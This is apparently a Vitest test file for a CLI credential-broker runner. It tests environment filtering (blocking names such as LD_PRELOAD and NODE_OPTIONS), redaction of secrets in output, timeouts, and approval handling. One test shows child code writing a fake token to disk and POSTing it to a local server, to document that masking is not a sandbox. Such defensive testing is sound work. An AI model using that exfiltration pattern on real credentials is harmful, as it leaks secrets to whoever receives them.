// @vitest-environment node
import { expect, test, vi } from "vitest";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createServer } from "node:http";
import {
  childEnvironment,
  commandContext,
  executeCommand,
  streamRedactor,
  secretVariants,
  runApproved,
} from "../cli/run.mjs";
const secret = "xoxp-fake-secret/12345";
test("child receives dedicated provider credential without broker credentials", () => {
  expect(
    childEnvironment("SLACK_TOKEN", secret, {
      PATH: "/bin",
      HOME: "/home",
      SCOPE_TOKEN: "broker",
      WORKOS_API_KEY: "broker",
      VERCEL_OIDC_TOKEN: "broker",
      AWS_SECRET: "unneeded",
    }),
  ).toEqual({ PATH: "/bin", HOME: "/home", SLACK_TOKEN: secret });
  for (const env of [
    "PATH",
    "SCOPE_TOKEN",
    "NODE_OPTIONS",
    "LD_PRELOAD",
    "invalid-name",
  ])
    expect(() => childEnvironment(env, secret)).toThrow();
});
test("redaction covers literal, common encoded forms and chunk boundaries in both streams", async () => {
  let output = "";
  const redact = streamRedactor([secret], (text) => (output += text));
  const raw = secretVariants([secret]).join("|");
  for (const char of raw) redact.write(Buffer.from(char));
  redact.end();
  expect(output.split("|").every((value) => value === "[REDACTED]")).toBe(true);
  const command = await commandContext(
    [
      process.execPath,
      "-e",
      "process.stdout.write(process.env.SLACK_TOKEN);process.stderr.write(Buffer.from(process.env.SLACK_TOKEN).toString('base64'));process.exitCode=7",
    ],
    process.cwd(),
    "SLACK_TOKEN",
  );
  let out = "",
    err = "";
  expect(
    await executeCommand(command, secret, {
      stdout: (text) => (out += text),
      stderr: (text) => (err += text),
    }),
  ).toMatchObject({ exitCode: 7 });
  expect(out).toBe("[REDACTED]");
  expect(err).toBe("[REDACTED]");
});
test("runner bounds output, time and cancellation, returning meaningful exit statuses", async () => {
  const command = await commandContext(
    [process.execPath, "-e", "setInterval(()=>{},1000)"],
    process.cwd(),
    "SLACK_TOKEN",
  );
  expect(
    await executeCommand(command, secret, { timeoutMs: 50 }),
  ).toMatchObject({ exitCode: 124, reason: "timeout" });
  const controller = new AbortController();
  setTimeout(() => controller.abort(), 50);
  expect(
    await executeCommand(command, secret, { signal: controller.signal }),
  ).toMatchObject({ exitCode: 130, reason: "cancelled" });
  const noisy = {
    ...command,
    argv: [process.execPath, "-e", "process.stdout.write('x'.repeat(100000))"],
  };
  expect(
    await executeCommand(noisy, secret, { outputLimit: 100, stdout: () => {} }),
  ).toMatchObject({ exitCode: 125, reason: "output-limit" });
});
test("masking is not a sandbox: fake credential can be written or sent by arbitrary child code", async () => {
  const directory = await mkdtemp(join(tmpdir(), "scope-disclosure-")),
    file = join(directory, "fake-token.txt");
  let received = "";
  const server = createServer((req, res) => {
    req.on("data", (chunk) => (received += chunk));
    req.on("end", () => res.end("received"));
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = (server.address() as { port: number }).port;
  try {
    const command = await commandContext(
      [
        process.execPath,
        "--input-type=module",
        "-e",
        `import {writeFileSync} from 'node:fs';writeFileSync(${JSON.stringify(file)},process.env.SLACK_TOKEN);await fetch('http://127.0.0.1:${port}',{method:'POST',body:process.env.SLACK_TOKEN});console.log('done')`,
      ],
      process.cwd(),
      "SLACK_TOKEN",
    );
    expect(
      await executeCommand(command, secret, { stdout: () => {} }),
    ).toMatchObject({ exitCode: 0 });
    expect(await readFile(file, "utf8")).toBe(secret);
    expect(received).toBe(secret);
  } finally {
    server.close();
    await rm(directory, { recursive: true, force: true });
  }
});
test("one invocation freezes context, waits, receipts privately and never reruns a started command", async () => {
  const journalRoot = await mkdtemp(join(tmpdir(), "scope-run-"));
  const command = await commandContext(
    [process.execPath, "-e", "console.log('done')"],
    process.cwd(),
    "SLACK_TOKEN",
  );
  const args = {
    accountId: "account",
    reason: "Summarize",
    command,
    key: "invocation-key-1234",
    timeoutMs: 1000,
  };
  const context = {
    status: "active",
    accountId: "account",
    reason: "Summarize",
    command: { envVar: command.envVar, cwd: command.cwd, argv: command.argv },
    grantVersion: 1,
    requesterConnectionId: "cli",
    snapshot: { grantedScopes: ["channels:read"] },
  };
  let statuses = 0;
  const call = vi.fn(async (operation: string, _body?: unknown) => {
    if (operation === "request") {
      expect(_body).not.toHaveProperty("command");
      return { id: "request", approvalUrl: "https://scope/access" };
    }
    if (operation === "status")
      return statuses++ ? context : { status: "pending" };
    if (operation === "deliver")
      return {
        ...context,
        status: "ready",
        requestId: "request",
        grantedScopes: ["channels:read"],
        accessToken: secret,
        until: Date.now() + 10000,
        receiptProof: "private",
      };
    if (operation === "receipt") return { received: true };
    throw new Error("Unexpected operation");
  });
  const execute = vi.fn(async () => ({ exitCode: 0 }));
  try {
    expect(
      await runApproved(args, {
        call,
        execute,
        journalRoot,
        output: () => {},
        wait: async () => {},
      }),
    ).toEqual({ exitCode: 0 });
    expect(call.mock.calls.find((c) => c[0] === "request")?.[1]).toEqual({
      accountId: "account",
      reason: "Summarize",
      agentName: "CLI",
    });
    await runApproved(
      {
        ...args,
        key: "another-invocation-123",
        command: {
          ...command,
          argv: [process.execPath, "-e", "console.log('second')"],
        },
      },
      { call, execute, journalRoot, output: () => {} },
    );
    expect(execute).toHaveBeenCalledTimes(2);
    const saved = await readFile(join(journalRoot, args.key + ".json"), "utf8");
    expect(saved).not.toContain(secret);
    expect(saved).not.toContain("receiptProof");
    await expect(
      runApproved(args, { call, execute, journalRoot }),
    ).rejects.toThrow("already started");
    await expect(
      runApproved(
        { ...args, reason: "Changed" },
        { call, execute, journalRoot },
      ),
    ).rejects.toThrow("Invocation changed");
    expect(execute).toHaveBeenCalledTimes(2);
  } finally {
    await rm(journalRoot, { recursive: true, force: true });
  }
});
test("denied, expired and mismatched approvals never start a child", async () => {
  const journalRoot = await mkdtemp(join(tmpdir(), "scope-run-denied-")),
    execute = vi.fn();
  const command = await commandContext(
    ["node", "-e", "console.log('never')"],
    process.cwd(),
    "SLACK_TOKEN",
  );
  try {
    for (const status of ["denied", "expired", "unavailable", "ended"]) {
      const call = vi.fn(async (operation: string) =>
        operation === "request" ? { id: "request" } : { status },
      );
      await expect(
        runApproved(
          {
            accountId: "account",
            reason: "Read",
            command,
            key: "invocation-key-" + status,
          },
          { call, execute, journalRoot, output: () => {} },
        ),
      ).rejects.toThrow();
      expect(call.mock.calls.map((c) => c[0])).not.toContain("deliver");
    }
    expect(execute).not.toHaveBeenCalled();
  } finally {
    await rm(journalRoot, { recursive: true, force: true });
  }
});

test("detached descendants inheriting pipes cannot keep a timed-out runner waiting", async () => {
  const directory = await mkdtemp(join(tmpdir(), "scope-pipes-")),
    file = join(directory, "pid");
  const program = `const {spawn}=require('node:child_process');const fs=require('node:fs');const p=spawn(process.execPath,['-e','setInterval(()=>{},1000)'],{detached:true,stdio:['ignore',1,2]});fs.writeFileSync(${JSON.stringify(file)},String(p.pid));setInterval(()=>{},1000)`;
  const command = await commandContext(
    [process.execPath, "-e", program],
    process.cwd(),
    "SLACK_TOKEN",
  );
  const started = Date.now();
  try {
    expect(
      await executeCommand(command, secret, {
        timeoutMs: 300,
        stdout: () => {},
        stderr: () => {},
      }),
    ).toMatchObject({ exitCode: 124, reason: "timeout" });
    expect(Date.now() - started).toBeLessThan(2500);
  } finally {
    try {
      process.kill(Number(await readFile(file, "utf8")), "SIGKILL");
    } catch {}
    await rm(directory, { recursive: true, force: true });
  }
});
test("cancelling while waiting never ends the shared approval", async () => {
  const journalRoot = await mkdtemp(join(tmpdir(), "scope-abort-")),
    controller = new AbortController(),
    execute = vi.fn();
  const call = vi.fn(async (op: string) => {
    if (op === "request") {
      controller.abort();
      return { id: "shared" };
    }
    throw new Error("unexpected");
  });
  try {
    await expect(
      runApproved(
        {
          accountId: "account",
          reason: "Read",
          command: {
            argv: ["node"],
            cwd: process.cwd(),
            envVar: "SLACK_TOKEN",
          },
          key: "invocation-abort-123",
        },
        {
          call,
          execute,
          journalRoot,
          signal: controller.signal,
          output: () => {},
        },
      ),
    ).rejects.toThrow("cancelled");
    expect(call.mock.calls.map((c) => c[0])).toEqual(["request"]);
    expect(execute).not.toHaveBeenCalled();
  } finally {
    await rm(journalRoot, { recursive: true, force: true });
  }
});
